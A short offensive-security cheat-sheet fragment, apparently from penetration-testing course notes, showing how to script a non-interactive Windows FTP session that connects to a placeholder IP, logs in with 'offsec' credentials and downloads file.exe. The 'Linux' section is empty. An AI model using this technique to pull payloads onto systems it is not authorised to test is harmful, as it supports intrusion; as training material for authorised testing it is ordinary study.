### FTP

Windows
echo "open <IP>">ftp.txt  
echo "offsec">>ftp.txt  
echo "offsec">>ftp.txt  
echo "bin">>ftp.txt  
echo "get file.exe">>ftp.txt  
echo "bye">>ftp.txt  

ftp -s ftp.txt  

Linux
